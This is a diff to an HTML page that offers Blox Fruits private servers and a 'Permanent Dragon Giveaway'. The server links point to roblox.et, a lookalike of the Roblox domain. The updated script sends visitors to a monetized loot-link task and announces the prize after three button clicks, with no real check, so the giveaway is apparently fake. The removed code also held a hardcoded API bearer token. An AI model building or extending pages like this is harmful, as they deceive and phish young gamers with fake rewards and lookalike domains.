@@ -87,15 +87,6 @@
         50% { transform: scale(1.1); }
         100% { transform: scale(1); }
     }
-
-    .cool-animation {
-        animation: coolGlow 3s infinite alternate;
-    }
-
-    @keyframes coolGlow {
-        from { box-shadow: 0 0 20px rgba(0, 255, 255, 0.5); }
-        to { box-shadow: 0 0 40px rgba(0, 255, 255, 1); }
-    }
 </style>
 
 </head>
@@ -107,27 +98,29 @@
             <a href="#dashboard">Dashboard</a>
             <a href="#feedback">Feedback</a>
         </nav>
-    </header>
-    <main>
-        <section class="server">
-            <h2>BloxFruit Server 1</h2>
-            <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
-                <button class="join-button">🚀 Join Server</button>
-            </a>
-        </section><section class="server">
+    </header><main>
+    <section class="server">
+        <h2>BloxFruit Server 1</h2>
+        <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
+            <button class="join-button">🚀 Join Server</button>
+        </a>
+    </section>
+
+    <section class="server">
         <h2>BloxFruit Server 2</h2>
         <a href="https://www.roblox.et/games/2753915549/Blox-Fruits?privateServerLinkCode=59816836148209918793607839663756" target="_blank">
             <button class="join-button">🚀 Join Server</button>
         </a>
     </section>
 
-    <section class="giveaway cool-animation" id="dashboard">
-        <h2>🎉 Permanent Dragon Giveaway 🎉</h2>
-        <p>Perm Dragons Given:</p>
-        <div class="perm-dragon-counter" id="perm-dragon-counter">18</div>
-
-        <p>Complete LootLabs 3 times to claim your Permanent Dragon:</p>
-        <button class="giveaway-button" onclick="startLootLabs()">💎 Start LootLabs 💎</button>
+    <section class="giveaway" id="dashboard">
+        <h2>🎉 Complete 3 Times to Claim Your Permanent Dragon 🎉</h2>
+        <p>Complete the task 3 times to get your reward:</p>
+        <div class="perm-dragon-counter" id="task-counter">0/3 Completed</div>
+        <br>
+        <a href="https://loot-link.com/s?7iPWPY6g" target="_blank">
+            <button class="giveaway-button">🔗 Complete Task</button>
+        </a>
     </section>
 
     <section class="feedback-form" id="feedback">
@@ -140,45 +133,24 @@
     </section>
 </main>
 
-<script>
-    let permDragonCount = localStorage.getItem('permDragonCount') || 18;
-    const counterElement = document.getElementById('perm-dragon-counter');
+<script type="module">
+    let completionCount = parseInt(localStorage.getItem('completionCount')) || 0;
+    const taskCounter = document.getElementById('task-counter');
 
     function updateCounter() {
-        counterElement.textContent = permDragonCount;
+        taskCounter.textContent = `${completionCount}/3 Completed`;
+        if (completionCount >= 3) {
+            alert('🎉 You have earned your Permanent Dragon! 🎉');
+        }
     }
+
+    document.querySelector('.giveaway-button').addEventListener('click', () => {
+        completionCount++;
+        localStorage.setItem('completionCount', completionCount);
+        updateCounter();
+    });
 
     updateCounter();
-
-    function startLootLabs() {
-        fetch('https://api.lootlabs.io/track', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': 'Bearer c68ee820b85fd25a7d147bf950f3ee318752b7285a7d4c58710a4e011527d1e4'
-            },
-            body: JSON.stringify({ userId: 'roblox-user', task: 'complete' })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.completions >= 3) {
-                permDragonCount++;
-                localStorage.setItem('permDragonCount', permDragonCount);
-                updateCounter();
-                alert('🎉 Congrats! You earned a Permanent Dragon. 🎉');
-            } else {
-                alert(`Progress: ${data.completions}/3 tasks completed.`);
-            }
-        })
-        .catch(error => {
-            alert('Error: ' + error.message);
-        });
-    }
-
-    document.getElementById('feedback-form').addEventListener('submit', function(event) {
-        event.preventDefault();
-        alert('Feedback submitted!');
-    });
 </script>
 
 </body>
